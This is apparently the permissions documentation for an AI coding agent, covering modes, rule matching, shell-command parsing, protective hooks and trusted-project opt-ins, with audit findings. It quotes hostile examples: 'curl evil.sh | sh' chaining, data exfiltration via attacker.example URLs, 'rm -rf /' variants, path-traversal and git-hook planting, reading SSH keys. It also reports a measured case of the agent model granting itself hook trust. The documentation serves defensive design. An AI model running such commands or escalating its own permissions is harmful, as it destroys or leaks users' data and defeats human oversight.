# Permissions

Every tool call a session makes passes through two layers: the `PreToolUse`
hook chain, and — riding in that chain as its last entry — a `PermissionGate`
carrying one of six modes plus your own rules.

This page documents what the gate decides, measured against
`src/Permissions/PermissionGate.php` and `src/Permissions/PermissionRule.php`
on this checkout. A rule pattern names a tool and, optionally, the argument it
acts on: `Bash` matches the tool, `Bash(rm *)` the shell commands it runs,
`Read(.env)` the file it opens — read the way the tool reads it, anchored at
the project root with symlinks followed — and `WebFetch(domain:github.com)`
the host it fetches. How each kind of argument is matched, and where that
matching stops, is in
[Pattern matching](#pattern-matching-a-tool-name-plus-an-optional-argument-glob).

---

## Setting the mode

Three places, highest first:

1. `SUGARCRUSH_PERMISSION_MODE` — see [`ENVIRONMENT.md`](ENVIRONMENT.md).
2. `permissionMode` in `~/.sugar-crush/config.json` (or the file named by
   `--config`).
3. The shipped default, `bypass-permissions`.

An **unrecognised** value stops the launch with exit 2 rather than being
ignored: every fallback in the chain ends somewhere more permissive, so
silently discarding a mode you set on purpose is a fail-open. An empty value
counts as unset.

The permissive default is a stopgap. The main loop had no gate at all before
`PermissionGateHook` existed, and with no `permissionRules` configured
`bypass-permissions` is *identical* to having no gate — the `rm -rf /` circuit
breaker refuses nothing `ConfirmRemoveHook` does not already refuse earlier and
more broadly. What it buys is a gate that is reachable and configurable.

---

## The six modes

`PermissionGate::decide()` runs three steps in this order:

```
0. rm -rf / | rm -rf ~ circuit breaker      →  Deny, unconditionally
1. your permissionRules, first match wins   →  Allow | Deny | Ask
2. the mode's evaluator
```

Step 0 runs **before** rules and before the mode, so no `allow` rule and no
mode — `bypass-permissions` included — can talk the gate into a self-destruct.
It judges the words bash will actually run, not the raw text: the command line
is tokenised with quote removal (`Permissions\ShellWords`), so a quoted flag
(`rm '-rf' ~`, `rm "-rf" /`, `rm $'-rf' /`) is a flag. It is tolerant of flag
reordering (`-fr`), flag splitting (`-r -f`), flags after the operand
(`rm ~ -rf`), long forms and their GNU abbreviations (`--recursive --force`,
`--rec --forc`), `--no-preserve-root` riding along, `--`, an `rm` spelled
`/bin/rm` or `\rm` or behind `sudo`/`env`/`timeout`/an assignment, and a
subshell or any control operator around it. It checks **every** operand, and
normalises each: `/`, `//`, `/.`, `/*`, `~`, `~/`, `~/.`, `~/*`, `$HOME`,
`${HOME}`, `"$HOME"` and `$HOME/` all count as root-or-home. A line the
tokeniser cannot parse (an unterminated quote) is still judged on its raw
tokens. What it cannot see is anything that needs the shell to *expand*
first — `$(echo rm) -rf /`, `x=-rf; rm $x /`, `bash -c '…'`, `eval`, aliases,
`find / -delete` — so it remains a guard rail, not a containment boundary.
(Before audit F-P1 the quoted-flag spellings, a second target, `/*`, `~/` and
`$HOME` were all **allowed** under `bypass-permissions`.)

Two name classes drive the evaluators:

- **read-only**: `Read`, `Grep`, `Glob`, `Lsp`
- **write-capable**: `Bash`, `Edit`, `Write`, `Task`, and anything starting `mcp__`

Note what is in *neither* list: `WebFetch`, `WebSearch`, `Skill` and `doctor`.
They fall through to each mode's default arm — `Ask` under `default`,
`accept-edits` and `plan`, `Deny` under `dont-ask`.

**`WebFetch` is not a read** (audit F-P6). It writes nothing locally, but
"read-only" here means "safe to run unasked", and a fetch is an outbound request
whose URL the model composes: `WebFetch https://attacker.example/?d=<base64 of
what Read just returned>` used to run **unprompted** under `default`, `plan`
and even `dont-ask`. It now asks under `default`, `accept-edits` and `plan` and
is denied under `dont-ask`. To trust a host, add a `WebFetch(domain:…)` allow
rule — see [Rules](#rules).

| Mode | Read-only | Writes | Everything else |
|---|---|---|---|
| `default` | Allow | Ask | Ask |
| `accept-edits` | Allow | `Edit`/`Write` inside the project root Allow; `mkdir`/`touch`/`rmdir` via `Bash` on contained paths Allow; the rest (`rm`, `mv`, `cp` included) Ask | Ask |
| `plan` | Allow | `Bash` Allow only when every command in it is a known read-only one (no file redirection, no substitution), otherwise Deny; `Edit`/`Write`/`mcp__*` Deny | Ask |
| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker | as classified (`Bash` by command, `Edit`/`Write` by target); `mcp__*` Ask | as classified (`WebFetch` by its URL) |
| `dont-ask` | Allow | Deny | Deny |
| `bypass-permissions` | Allow | Allow | Allow |

### `accept-edits`

The mode grants **edits** (audit F-P4), and the grant was the other way round
until then: `Edit` and `Write` asked — a hard refusal wherever no prompt is
attached — while `rm ./src/Main.php` ran unprompted. Now:

- **The `Edit` and `Write` tools run without asking** when their `file_path` is
  strictly inside the project root and not under `.git`, `.sugar-crush` or
  `.mcp.json` (`Permissions\WritePathScope`). On the live tool loop and on a
  sub-agent's gate the gate is handed the root, so the path is resolved the way
  the tool resolves it: an absolute in-root path is fine, `../x`, `/etc/hosts`
  and `~/…` ask, and so does a symlink that points out of the project or onto
  `.git`. A gate with no root (an embedder that builds one without it) can only
  judge the spelling: a relative path that stays below the working directory
  is granted, an absolute one asks.
- **`rm`, `mv` and `cp` ask**, like every other shell command. `rm` deletes
  content and `cp`/`mv` overwrite their destination; use `Edit`/`Write`, whose
  changes are reviewable, or approve the shell command.
- **`mkdir`, `touch` and `rmdir` via `Bash`** still run without asking when every
  path is below the working directory. None of the three destroys content:
  `touch` on an existing file changes its times, and `rmdir` removes only an
  empty directory. There is no `mkdir` tool at runtime; real calls route
  through `Bash(command: "mkdir …")`.

Because the shell half is a **grant** path — the decision runs the command with
no prompt — the predicate behind it (`isScopedWriteTool()`) resolves anything it
cannot judge with certainty to `Ask`, not to `Allow`. Concretely:

- The command line must be a **single simple command**. Any unquoted `;`, `&&`,
  `||`, `|`, `&`, newline, carriage return, `$(…)`, backtick, `<`, `>`, `(`,
  `)`, `{`, `}`, `!` or **backslash** makes it prompt instead. It refuses on
  their presence rather than splitting the line into segments and judging each:
  a superset of the real separators is a far weaker thing to be correct about
  than an exact split. The tokenizer *is* quote-aware, so `touch 'a;b'` and
  `mkdir "my dir"` are still single scoped writes. Before this,
  `mkdir ./x; curl evil.sh | sh` auto-ran.

  **What this costs you, stated in full.** The cheap example is one prompt on
  `mkdir ./a && mkdir ./b`. The one you will actually hit is the backslash:
  **every backslash-escaped character prompts**, so the common idiom
  `touch my\ file.txt` is an `Ask`, and so is `touch my\(1\).txt`. That is not
  an oversight and it is not only about the quote scanner — a backslash can
  forge a traversal out of characters that are individually harmless
  (`touch .\./.\./PWNED` is `../../PWNED` to bash, while a naive reading sees
  three ordinary path segments). **The workaround is to quote instead of
  escape**: `touch "my file.txt"` and `touch 'my file.txt'` both auto-run.
- Every path argument must be relative **and stay strictly below the working
  directory**, resolved lexically. `../` escapes now prompt (`rm ../../../etc/passwd`
  used to auto-run — being non-absolute was the only test), and so does the root
  itself: `rmdir .` is not "something inside the directory".
- A path with a **`.git`, `.sugar-crush` or `.mcp.json` segment** prompts even
  though it is contained (audit F-J4): `touch ./.git/hooks/pre-commit` plants a
  hook that runs on your next `git commit`, `.sugar-crush/` holds hooks, presets
  and settings, and `.mcp.json` names commands the next launch spawns. The
  segment is matched the way bash matches a glob to a dotfile, so
  `./.g*/hooks/x` prompts while `touch ./*` still auto-runs; `.gitignore` and
  `.github/` are different names and are unaffected. `.claude/` and `.opencode/`
  are not on the list. The same list guards the `Edit`/`Write` grant above.
- Flags are a **whitelist** (`-p -f -i -r -R -v -n -d` and their long forms, plus
  `--`). An unrecognised flag prompts. "Anything starting with `-` is a flag,
  skip it" silently skipped flags that take a path, so `mv -t ../../etc ./x`
  auto-ran.
- The command word is matched **case-sensitively**. `MKDIR ./x` is not `mkdir`
  on a case-sensitive filesystem, and it used to auto-run.

Two limits of the shell half are deliberate and worth knowing. **Symlinks are
not resolved** — `touch ./link-pointing-outside` is spelled as a contained
relative path and is treated as one; resolving would mean touching the
filesystem and would still race the command being approved (the `Edit`/`Write`
grant *does* resolve, because those tools resolve the same way at use).
**Globs are not expanded** — `touch ./*` is judged as the literal token. Neither can introduce a command, which is what the
separator rule is for; brace expansion *can* name a parent (`{.,..}/x`), which
is why `{`/`}` are refused and `*`/`?`/`[` are not.

That last clause depends on the shell, and it is worth naming the dependency
rather than leaving it implicit. A glob is safe to judge literally because
approved commands are run through **bash**, which never returns `.` or `..` from
a pattern — so `./.*/` stays literal. Under `sh`/dash the same pattern expands to
`./../`, and a glob *would* escape the working directory. Anyone changing how
the `Bash` tool spawns its shell has to add `*`/`?`/`[` to the refused set at the
same time; there is a test that fails if the wrapper changes.

`plan` allows exploratory `Bash` **only when it can prove the command line is
read-only**, and denies everything else — including a line it cannot parse.
This is an allow-list, on purpose (`PermissionGate::isPlanReadOnlyBash()`,
audit F-P2). Until then `plan` ran every `Bash` call that three regexes did not
flag as a redirect: `echo x > f` was denied, but `echo x>f`, `echo x 2> f`,
`cat a >| f`, `sed -i …`, `rm src/main.php`, `git commit -am wip`,
`git push --force`, `curl -o f …` and `python3 -c "open('f','w')"` all **ran**.

A `Bash` call is allowed under `plan` when, after quote-aware tokenising
(`Permissions\ShellWords`), **all** of these hold:

- it parses completely (an unterminated quote, substitution or here-doc is
  denied);
- it contains no command or process substitution — `$(…)`, backticks, `<(…)`,
  `>(…)` — and no `${…}` / `$[…]` expansion (bash evaluates subscripts and
  `${x@P}` in ways that run a `$(…)` hidden in a variable's value; plain
  `$NAME` is fine);
- every redirection is harmless: an fd duplication (`2>&1`), an output
  redirection onto `/dev/null`, `/dev/stdout` or `/dev/stderr`, an input
  redirection (`< file`, except bash's `/dev/tcp/…`), or a here-string. Any
  output redirection onto a file is denied **in every spacing and form**
  (`>f`, `2> f`, `>|`, `&>`, `>>`); `<>` and here-docs are denied;
- every command in every pipeline and list (`|`, `&&`, `;`, newline) is on the
  read-only list, named literally — not by path (`/bin/cat`), not behind a
  `NAME=value` prefix:
  - any arguments: `cat`, `head`, `tail`, `ls`, `grep`/`egrep`/`fgrep`, `wc`,
    `cut`, `tr`, `nl`, `diff`, `cmp`, `comm`, `stat`, `du`, `df`, `basename`,
    `dirname`, `realpath`, `readlink`, `echo`, `pwd`, `cd`, `which`, `type`,
    `whereis`, `uname`, `id`, `whoami`, `true`, `false`, `jq`;
  - with the writing/executing arguments refused: `find` (no `-delete`,
    `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint*`, `-fls`), `sort` (no `-o`,
    `-T`, `--compress-program`), `uniq` (at most one operand — a second is the
    output file), `rg` (no `--pre`, `--hostname-bin`), `tree` (no `-o`, `-R`),
    `file` (no `-C`), `date` (display forms only), `printf` (no `-v`), and `git`
    limited to `status`, `log`, `show`, `diff`, `blame`, `shortlog`,
    `rev-parse`, `rev-list`, `ls-files`, `ls-tree`, `describe`, `cat-file`,
    `grep` (no `--output`, no `grep -O`), listing-only `branch`/`tag`,
    `remote [-v|get-url|show]`, and `config` with a read action (`--get`,
    `--list`, `get`, `list`). Global `git` options other than `--no-pager` are
    denied (`git -c core.pager=… log` runs a program). For these checked
    commands a word bash may still rewrite — an unquoted glob or brace, a
    `$VAR` — is denied, because `find . {-delete,}` hands `find` a `-delete`
    that no literal word shows; quote the pattern (`find . -name '*.php'`).

So `git log --oneline`, `grep -rn foo src`, `cat a | grep b | wc -l`,
`find . -name '*.php'` and `ls 2>/dev/null` run, and `ls; rm x`,
`cat a | tee b`, `git log $(rm x)`, `find . -delete` and `echo x>/tmp/f` are
denied. Deliberately **not** on the list: interpreters and editors (`sed`,
`awk`, `perl`, `python`, `php`, `node`), anything that runs another command
(`xargs`, `env`, `sudo`, `timeout`, `nohup`, `bash -c`, `eval`, `exec`,
`source`), `test`/`[` (`[ -v 'a[$(cmd)]' ]` runs `cmd`), pagers, `tee`, `xxd`,
`curl`/`wget`. A command missing from the list costs one denied step — the
model still has `Read`, `Grep` and `Glob`.

Two honest limits. A read is still a read: `cat ~/.ssh/id_rsa` is allowed under
`plan` exactly as `Read` on that path would be — `plan` withholds writes, not
visibility, and secret files are `ProtectFilesHook`'s job. And `git` honours
the repository's own `.git/config`, which can name a program
(`core.fsmonitor`, `core.pager`, a diff driver); `plan` trusts a checkout's git
config the way running `git` in it by hand does. Note also that rules are
evaluated **before** the mode: an explicit allow rule such as
`Allow Bash(git *)` overrides `plan`, so `git push --force` runs under it.

A `Bash` **declaration** — a name with no arguments, which is what a workflow
stage's `tools:` list is — is still allowed under `plan`: it has no command to
judge, and each real call is judged when it arrives. A real call with no
`command` at all is denied.

### What `auto` classifies

`SafetyClassifier` reads three tools, each by the argument that carries its
risk (audit F-P3(b) — before it, only `Bash` was read, so
`Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
`mcp__db__drop_table` all ran under `auto`):

| Call | Blocked as | When |
|---|---|---|
| `Bash` | one of the command categories (`curl/wget-into-shell`, `external-endpoint`, `force-push-reset-hard`, …) | the command matches a row |
| `Edit` / `Write` | `protected-path-write` | the target is under `.git`, `.sugar-crush` or `.mcp.json` |
| `Edit` / `Write` | `outside-root-write` | the target is not provably inside the project root — absolute elsewhere, escaping, `~/…`, a symlink out, or absent |
| `WebFetch` | `external-endpoint` | the URL carries a query string or `user:pass@`, or cannot be parsed |
| `mcp__*` | — (asks) | always: an MCP tool's capability is server-defined, so nothing can classify it |

A `WebFetch` whose URL carries no query is allowed. Data can still ride in a
URL's *path* (`https://evil.example/<base64>`), which no classifier can tell
from an ordinary page; `auto` is a guard rail here, and `default`/`dont-ask`
withholding `WebFetch` outright is the boundary. An `mcp__*` ask is neither a
strike nor a safe call, so it leaves the breaker exactly where it was. An
explicit rule still comes first — `Allow mcp__git__*` grants those tools under
`auto` without asking.

### `auto`'s circuit breaker

`auto` classifies each call through `SafetyClassifier` and keeps counters on
the gate instance: three consecutive blocks of one category, or twenty blocks in
total, escalate to `Ask`. Those counters are **mutated by `evaluate()`**, which
is why the class has a second, read-only entry point — `refuses()` — for callers
holding a `ToolDeclaration` rather than a real call. Asking a hypothetical
question through `evaluate()` moved a counter a real call is judged by.

---

## Rules

```json
{
  "permissionMode": "default",
  "permissionRules": [
    { "pattern": "Bash",          "action": "ask"   },
    { "pattern": "mcp__git__*",   "action": "allow" },
    { "pattern": "Write",         "action": "deny"  }
  ]
}
```

`action` is one of `allow`, `deny`, `ask`. Rules are evaluated **in order, first
match wins**, ahead of the mode.

Malformed entries are handled item-wise and reported on stderr **and in the
session transcript** rather than silently widening or narrowing the whole list
(a dropped `deny` rule denies nothing, and stderr alone is invisible under the
alt screen — see [`SETTINGS.md`](SETTINGS.md)): an entry with no string
`pattern`, or an `action` that is not one of the three, is skipped with a named
index — `permissionRules[2] ('Write') has no valid 'action' … rule skipped
rather than coerced`. A `permissionRules` key that is not a list at all loads
zero rules and says so.

### Pattern matching: a tool name, plus an optional argument glob

A pattern is `Tool` or `Tool(argument-glob)`, and both halves are `fnmatch()`
(`PermissionRule::matches()`): `Bash*` is a prefix match, `mcp__*__push`
works, and the argument half is matched against the tool's **subject**
argument (`PermissionRule::SUBJECT_ARGUMENTS`) — `command` for `Bash`,
`file_path` / `path` for the file tools, `url` for `WebFetch`, `query` for
`WebSearch`, `name` for `Skill`. Measured on this tree, `bypass-permissions`
mode, `Bash{command: "rm -rf build"}`:

| rule | decision |
|---|---|
| `Deny Bash(rm *)` | Deny |
| `Deny Bash` | Deny |
| `Deny Bash*` | Deny |
| *(no rules)* with `command: "rm -rf /"` | Deny (step 0, the breaker) |

(This section used to be titled "Pattern matching is name-only" and to show
`Bash(rm *)` → **Allow**. That was true while the only matcher compared the tool
name; argument-scoped patterns have matched since the matcher moved into
`PermissionRule`, and the old table no longer describes the code.)

How the argument half is matched:

- **Shell subjects** (`Bash`) are split into simple commands by a quote-aware
  tokeniser (`ShellWords`): on every **unquoted** `;`, `&`, `&&`, `|`, `||`,
  newline and subshell paren, so `git commit -m "a; b"` is one command. A
  restrictive rule (`deny`, `ask`) fires when the whole command **or any
  segment** matches — each segment read both as written and after quote
  removal, so `Deny Bash(rm *)` catches `echo hi && rm -rf build` and
  `true; 'rm' -rf build`. A permissive one (`allow`) fires only when **every**
  segment matches, so `Allow Bash(git *)` does **not** grant `git log && rm x`
  (measured: Deny under `dont-ask`).
- **A shell `allow` fails closed** (audit F-P5). A greedy `*` used to swallow
  whatever sat inside one segment: measured under `dont-ask` with
  `Allow Bash(git *)`, `git log $(id)`, ``git log `id` `` and
  `git log > /home/u/.bashrc` were all **Allow**. Now an `allow` rule does not
  match — the call falls through to the mode — when the command line holds,
  outside single quotes, a command or process substitution (`$(…)`, backticks,
  `<(…)`, `>(…)`), a `${…}` / `$[…]` expansion, or a redirection that writes or
  opens something (`>`, `>>`, `&>` onto a file, `<>`, a here-doc); or when it
  does not parse (an unterminated quote). All three of the measured commands
  are now **Deny** under `dont-ask`. Still granted by `Allow Bash(git *)`:
  `git log 2>/dev/null`, `git log 2>&1`, `git apply < fix.patch`, and
  `git log --format='$(x)'` (single-quoted, so literal). A rule that **spells
  the construct itself** covers it — `Allow Bash(git log > /tmp/*)` grants
  `git log > /tmp/out` — and is then matched against the command as written,
  never the quote-removed words, so a quoted `'>'` cannot stand in for a real
  redirection.
- **`WebFetch(domain:…)`** matches the **host** of the url, not the url text
  (audit F-P6) — Claude Code's spelling, so an imported preset's
  `WebFetch(domain:github.com)` works as written. The host is read by the same
  parser the tool dials with, so `https://github.com@evil.example/` is
  `evil.example`. The value is a case-insensitive glob over the host:
  `domain:github.com` is that host, `domain:*.github.com` its subdomains (write
  both to allow both). An `allow` covers exactly what it spells; a `deny` or
  `ask` also covers subdomains (`Deny WebFetch(domain:evil.example)` stops
  `x.evil.example`), and fires on a url nobody can parse, where an `allow` does
  not. Granting a domain also grants wherever it **redirects** — `WebFetch`
  follows up to three redirects, re-checking addresses but not rules. A
  `WebFetch(...)` pattern without `domain:` is still a literal glob over the
  whole url, and a poor grant: `Allow WebFetch(https://github.com*)` also
  matches `https://github.com.evil.example/`.

  ```json
  { "pattern": "WebFetch(domain:docs.php.net)", "action": "allow" }
  ```
- **Path subjects** are normalised lexically on both sides — `./`, `//`, `.`
  and `..` segments — so `Deny Read(./.env)` also covers `.env` and
  `./foo/../.env`, and a relative restrictive pattern matches at any depth
  (`/home/you/proj/.env`).
- **A path rule judges the file the tool will open** (audit F-J3). The tools
  resolve a relative path against `--root`, and both the gate on the live hook
  chain and a sub-agent's — its session gate and its preset's own
  `tools` / `disallowedTools` grant (`Agents\AgentManager`) — are handed that
  root, so each also reads the call anchored at the root and resolved on disk (symlinks followed; for a file that does not exist
  yet, its nearest existing parent). Measured before the fix with
  `Deny Read(/proj/secret.txt)`: `secret.txt` and `./secret.txt` were
  **Allow**, and so was a symlink `notes -> secret.txt`. Now `secret.txt`,
  `./secret.txt`, `sub/../secret.txt`, `notes`, and the same file reached
  through a symlinked root are all **Deny**, and an absolute pattern written
  with either spelling of a symlinked root matches. `deny` and `ask` fire on
  **any** of these spellings. An `allow` fires only when the call's spelling
  (as written, or anchored at the root — so `Allow Write(/proj/src/*)` covers
  `src/a.php`) **and** the resolved file both match, so a symlink cannot
  launder a grant: `src/link -> /etc/passwd` gets the mode's answer, not the
  rule's — including a symlink inside an allowed tree that you meant to allow.

Its limits, stated because each one is real:

- **Every argument-scoped deny is advisory.** It matches a *spelling*, and a
  command has spellings no glob enumerates: `Deny Bash(rm *)` does not catch
  `/bin/rm -rf build` (measured: Allow), `$(echo rm) -rf build`,
  `bash -c 'rm -rf build'` or `find build -delete`; a path deny does not
  survive a hard link or a bind mount, and only catches a symlink or a
  relative spelling of an absolute pattern where the caller knows the
  workspace root. The main tool loop and the sub-agent gate do; a gate an
  embedder builds without one matches spellings only. A declaration check
  needs none — a declaration has no path to spell — and Chat's own `!` shell
  checks judge only `Bash` commands, which a root does not re-spell. Treat it
  as a guard rail against an accident.
- **A shell `allow` is per rule, and still a glob over arguments.**
  `Allow Bash(git *)` plus `Allow Bash(grep *)` does not grant
  `git log | grep x` — rules are first-match-wins and no single rule covers
  both commands, so spell such a pipeline as its own rule. And `git *` grants
  every `git` argument list, including ones that make git itself run a
  program (`git -c core.pager=…`); the fail-closed checks stop the *shell*
  from running something extra, not the granted program.
- Rules are evaluated **before** the mode, so an `allow` rule overrides even
  `plan`'s read-only `Bash` check (`Allow Bash(git *)` lets `git push --force`
  run under `plan`).
- An argument-scoped rule does not refuse a **declaration** (a workflow stage's
  `tools: [Bash]`), only a real call — one `Deny Bash(rm *)` should not make
  every stage that declares `Bash` unusable.

The tool names a pattern can start with: `Bash`, `Edit`, `Write`, `Read`,
`Grep`, `Glob`, `WebFetch`, `WebSearch`, `Lsp`, `Skill`, `doctor`, and
`mcp__<server>__<tool>` for bridges (`mcp__git__*`). To constrain a command
beyond what a glob can say, use a hook matcher instead — see
[`HOOKS.md`](HOOKS.md).

**`doctor` is lower-case**, and this list said `Doctor` — not a typo without a
consequence. Matching is `fnmatch()`, which is case-sensitive, so a rule copied
from this page as `Doctor` matched no tool and denied nothing, which is the
exact silent-no-op failure the rules reader warns about elsewhere. Verified by
executing `PermissionRule::matchesToolName('Doctor', 'doctor')` — `false`.

### `Ask` needs somewhere to ask

`Ask` is only meaningful where somewhere to ask exists. There are now three
situations, not two:

- **`Chat`** shows a modal and settles the paused call.
- **The console paths** attach `HeadlessPermissionPrompt` as `Runtime`'s
  approver. At a terminal it asks on **stderr** and reads the answer from
  stdin, granting only on a literal `y`/`yes`. With no terminal it does not
  read — it refuses, naming the tool, the mode and the two things that change
  the outcome. Two callers do this, and the same probe decides opposite ways
  for them:
  - the **one-shot `-p` / `run` path** (`NonInteractive::consoleBackend()`),
    which owns stdin and is prompted at a real terminal;
  - the **background-session daemon**
    (`Sessions\BackgroundSessionRunner::backend()`), whose fd 0 is `/dev/null`
    from the spawn site, so it always takes the refusal branch. It is attached
    there not to prompt — nobody is watching a daemon — but so the session's
    log records *which* tool was refused under *which* mode and what to change,
    instead of the bare "no approver is attached to this run".
- **Everything else**, the TUI's engine path included, still fails **closed**:
  `Runtime::settleAsk()` turns an `Ask` into a denial when no approver is
  attached, and `Bootstrap` deliberately attaches none for a caller inside a
  TUI, because a closure that blocks on stdin would fight the render loop for
  keystrokes.

And any caller that holds no prompt at all must not turn "would
have asked" into "no" — `PermissionGate::refuses()` answers `true` only for
`Deny`, and `Chat::refuseCommandShell()` follows the same rule for a custom
command's `` !`cmd` `` form.

**A refusal is recognised by who made it, not by what it says.** Every refused
call reaches the model as a result whose text opens with `Hook denied:`,
`Permission denied:` or `Permission required:` — but that text is not what
the `-p` document's `refusals` array, the background daemon's log or the TUI's
struck-through row read. The party that refuses the call (`Runtime::gate()`,
the TUI's permission prompt) stamps the kind on the result itself
(`ToolResult::denial()`), and only that field counts. A tool that *ran* and
failed with output opening the same way — `printf 'Permission denied: …'; exit 1`,
or an MCP server's error text — is an ordinary failed call on every surface,
because it was one (audit F-P8).

---

## The hooks that outrank the gate

`Bootstrap::hooks()` registers the built-ins **first** and the gate **last**:

```
ProtectFilesHook  →  ConfirmRemoveHook  →  AuditHook  →  [your hooks.yaml]  →  PermissionGateHook
```

Both orders are fail-closed as to the verdict — `HookRegistry::executeHooks()`
lets a `Deny` win outright and never lets an `Ask` grant anything — so the order
is chosen for the *quality* of the message. A narrow, specific hazard
("this hook denies Bash paths outside the workspace root: /etc") reads better
than the generic "permission mode 'plan' does not allow Edit".

The gate is not a replacement for them. Even under `bypass-permissions`,
`ProtectFilesHook` still refuses:

| Pattern | Applies to |
|---|---|
| `.env`, `.env.*`, `.envrc` (not the `.env.example`/`.sample`/`.dist`/`.template`/`.tpl` templates) | `Read`, `Edit`, `Write`, `Bash`, `Grep`, `Glob`, `Lsp`, `mcp__*` — reading it *is* the leak; `Grep` also never opens these files itself, even with `include_ignored: true` |
| `.git/config`, `config/*.php` | all of the above |
| `.sugar-crush/hooks.yaml`, `.sugar-crush/config.json`, `.sugar-crush/agents/` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) |
| `.git/hooks/`, `.git/info/` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) — a hook runs on your next `git commit`, outside any session (audit F-J4) |
| `.sugar-crush/settings.json`, `.sugar-crush/settings.local.json`, `.mcp.json`, `.sugar-crush/skills`, `.sugar-crush/commands`, `.sugar-crush/rules`, `.sugar-crush/workflows` | **writes only** (`Edit`, `Write`, `Bash`, `mcp__*`) — the rest of the policy surface: settings tiers, the MCP server list, and prompt text, commands and workflows the next session runs as yours |

`Bash` commands are matched both as written and with quotes removed, so
`cat ".env"` and `cat .env;true` are refused; see
[`HOOKS.md`](HOOKS.md#what-protect-files-covers). Because one shell string does
not say whether it reads or writes, `Bash` gets the write-only rows too:
`cat .git/hooks/pre-commit` is refused where `Read` of it is not.

`composer.json` and `composer.lock` are deliberately absent: they are committed
project files, neither secrets nor policy, and guarding them (as this table once
did) refused even `grep` of a manifest in a Bash command.

The `.sugar-crush` group — with `.mcp.json` beside it — is policy rather than
secrets, and a decision is changed by *writing* it — so reads are allowed
(opening `.sugar-crush/agents/reviewer.md` is how you debug a preset) and
writes are denied in every mode. The cost is that `Bash` cannot `cat
.mcp.json` or `ls .sugar-crush/skills` either, and a project skill or command
is edited by you rather than by the agent; once interactive approvals land
these rows move from deny to always-Ask (step 0.8b). The `.claude/` and
`.opencode/` trees sugar-crush also imports skills and agents from are not on
the list: they are other tools' configuration. That is not
theoretical: in the shipped `bypass-permissions` default, an unprompted write to
`trustedProjectHooks` followed by a provider switch was measured end-to-end as
the model granting itself the trust the gate exists to withhold.

`HookRegistry::executeHooks()` also **re-scans the whole chain against a
rewrite**, so a hook that turns `Bash{command:"ls"}` into
`Bash{command:"rm -rf /"}` is re-evaluated rather than slipping past the gate
registered behind it.

---

## The four `trustedProject*` keys

Four separate opt-ins live in `~/.sugar-crush/config.json`, each a list of
canonical project roots. They exist because a `git clone` can carry a file that
runs code — or a file that quietly picks your model — and the trust decision
must be yours, made before the untrusted content is read:

| Key | Gates | Documented in |
|---|---|---|
| `trustedProjectHooks` | `<root>/.sugar-crush/hooks.yaml` — shell on every tool call | [`HOOKS.md`](HOOKS.md) |
| `trustedProjectMcp` | `<root>/.mcp.json` — servers started at launch | [`MCP.md`](MCP.md) |
| `trustedProjectCommands` | `` !`cmd` `` forms in `<root>/.sugar-crush/commands/*.md` | [`COMMANDS.md`](COMMANDS.md) |
| `trustedProjectSettings` | `<root>/.sugar-crush/settings.json` and its `.local.json` sibling | [`SETTINGS.md`](SETTINGS.md) |

They are four separate keys rather than one, and that is a decision rather
than an accident: folding any of them into another would hand every root
already listed there a new capability *by upgrade* rather than by your
decision. Trusting a repository to run the shell commands in its `hooks.yaml`
is not the same grant as letting it start long-lived servers, which is not the
same grant as letting it choose which host every prompt in the session is sent
to.

Shared properties, in one place because all four are parsed by the same
function — `Bootstrap::trustedProjectRoots()` — with the same key name
substituted:

- **Absolute paths only.** The guard is not a special case for `"."` — it is
  `if (!self::isAbsolutePath($expanded))`, so **every** relative entry is
  refused. Measured: `.`, `..`, `../x`, `src/repo` and `./here` are all rejected;
  `/abs/path` and a Windows `C:\Users\you` are accepted. `~` and `~/…` are
  expanded to the home directory *before* the check, so those are fine.
  `"."` is only the shortest way to write the bug: it resolves against the
  working directory on every launch exactly as `--root` does, so it always
  matches, turning a per-path allowlist into "trust every repository I `cd`
  into". As `Bootstrap`'s own comment puts it, `"../x"` and `"src/repo"` are the
  same defect wearing a longer name.
  The entry is refused **loudly**, one warning naming the offending index and
  value, because a silently dropped entry leaves you believing you opted in. And
  it is refused rather than resolved-once-at-parse-time because there is nothing
  stable to anchor it to: this file is per-**user** and re-read every launch,
  while a CWD is per-**invocation**.
- **Read once per process and frozen.** A write made *during* a session cannot
  take effect in that session.
- **Read from the file `--config` names**, not unconditionally from
  `~/.sugar-crush/config.json`. All four go through
  `Bootstrap::permissionConfigLayers()`, which honours the override — so under
  `--config alt.json` a grant left in `~/.sugar-crush/config.json` is not
  consulted. See [`SETTINGS.md`](SETTINGS.md#opting-a-project-in).
- **Fail closed** on every uncertainty: an unresolvable root, an absent key, a
  key of the wrong shape.
- **A refusal is never silent.** Each prints one stderr line at construction
  time, before the alt screen is up, at most once per path per process — and
  the project-hook and project-directory refusals also seed a system row in the
  transcript, because an interactive launch paints over stderr 0.47s later.

**One property is NOT shared, and it is the one worth knowing.** A
`config.json` that exists and cannot be parsed stops the launch for the first
three keys — `PermissionConfigException` escapes construction, because each is
consulted from a path that should refuse to start on an unusable permission
policy. `trustedProjectSettings` swallows that throw
(`Bootstrap::projectSettingsTrusted()` is the only member of the family that
does), because it is consulted from `readUserConfig()`, whose contract is that
a corrupt config costs you your theme rather than your session, and which
`EngineBackend` calls once per turn. So on an unparseable config the first
three refuse the launch and the fourth quietly contributes nothing — which is
still fail-closed, since the project settings layer is the lowest-trust input
in the stack and its absence is the pre-layering behaviour.

## Inspecting the live policy

```sh
sugarcrush doctor          # 'permission policy' line reports the resolved mode
```

`doctor` reports `FAIL` with the parser's own message when the config is
unusable — which is precisely the diagnosis you ran it for.

## See also

- [`HOOKS.md`](HOOKS.md) — the escape hatch for a rule a mode cannot express.
- [`SETTINGS.md`](SETTINGS.md) — the layered settings stack, and what a
  project file is allowed to contribute once you have trusted it.
- [`TROUBLESHOOTING.md`](TROUBLESHOOTING.md) — exit 2 at launch, and why.
